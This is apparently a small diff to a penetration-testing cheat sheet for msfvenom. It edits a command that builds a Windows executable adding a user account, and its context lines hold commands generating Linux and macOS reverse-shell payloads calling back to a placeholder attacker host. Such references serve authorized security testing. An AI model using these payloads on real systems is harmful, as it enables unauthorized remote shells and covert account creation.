@@ -125,10 +125,14 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <langua
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
 ```
 
+# msfvenom create user 
+
 ## MCreate User
 ```
-msfvenom -p windows/adduser USER=hacker PASS='Hacker123$' -f exe > adduser.exe
+msfvenom -p windows/adduser USER=<user|hacker> PASS='<pass|Hacker123$>' -f exe > adduser.exe
 ```
+
+# msfvenom Handler
 
 ## Metasploit Handler tcp 32bits staged
 ```
